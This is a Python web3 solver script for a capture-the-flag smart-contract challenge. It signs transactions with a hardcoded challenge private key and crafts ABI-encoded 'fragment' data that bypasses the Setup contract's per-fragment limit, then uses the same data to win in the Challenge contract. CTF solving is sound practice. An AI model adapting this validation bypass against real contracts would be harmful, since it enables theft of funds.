import time
from web3 import Web3
from eth_abi import encode

# --- CONFIGURATION ---
RPC_URL = "http://challenges.1pc.tf:53774/063c1b5d-4175-44e6-a4c4-ccf211d9c101"
PRIVKEY = "07144526b87f8398974749a98b7bdf4f8384ee9433fdff7e1d46d10e34730100"
SETUP_ADDR = "0xec67d3e77b0F4e843F7b565169e32106A18B6A66"
WALLET_ADDR = "0x567D81014C9e993B19C4Eba886E8ED8CE4100De3"

# Connect to RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    raise Exception("Failed to connect to RPC")

account = w3.eth.account.from_key(PRIVKEY)
print(f"Solver Address: {account.address}")

# --- ABI ---
SETUP_ABI = [
    {
        "inputs": [],
        "name": "challenge",
        "outputs": [{"internalType": "contract Challenge", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "bytes", "name": "agreement", "type": "bytes"}],
        "name": "bindPact",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

CHALLENGE_ABI = [
    {
        "inputs": [],
        "name": "registerSeeker",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "bytes", "name": "truth", "type": "bytes"}],
        "name": "transcend",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "ascended",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    }
]

# --- TRANSACTION HELPER ---
def send_tx(func_call, tx_desc):
    print(f"Sending tx: {tx_desc}...")
    tx = func_call.build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Tx Hash: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if receipt.status != 1:
        raise Exception(f"{tx_desc} failed!")
    print(f"{tx_desc} Success!")

# --- EXPLOIT LOGIC ---

# 1. Get Challenge Address
setup_contract = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
challenge_addr = setup_contract.functions.challenge().call()
challenge_contract = w3.eth.contract(address=challenge_addr, abi=CHALLENGE_ABI)

# 2. Register Seeker
try:
    send_tx(challenge_contract.functions.registerSeeker(), "Register Seeker")
except Exception:
    print("Already registered, continuing...")

# 3. Craft Payload
# We need 1000 ether total. The limit is 100 ether per fragment.
# We create 10 fragments of 100 ether each.
fragment_struct = (
    WALLET_ADDR,        # vessel
    100 * 10**18,       # essence (100 ether)
    b''                 # resonance
)
fragments = [fragment_struct for _ in range(10)]

# Encode: (SoulFragment[], bytes32, uint32, address, address)
# address #1: binder/invoker (must be msg.sender)
# address #2: witness (must be msg.sender)
encoded_data = encode(
    ['(address,uint256,bytes)[]', 'bytes32', 'uint32', 'address', 'address'],
    [fragments, b'\x00'*32, 0, WALLET_ADDR, WALLET_ADDR]
)

# 4. Bind Pact (Bypass validation in Setup)
send_tx(setup_contract.functions.bindPact(encoded_data), "Bind Pact (Setup)")

# 5. Transcend (Win in Challenge)
send_tx(challenge_contract.functions.transcend(encoded_data), "Transcend (Challenge)")

# 6. Verify
ascended = challenge_contract.functions.ascended().call()
if ascended == WALLET_ADDR:
    print(f"Solved. Ascended: {ascended}")
else:
    print(f"Failed. Current Ascended: {ascended}")
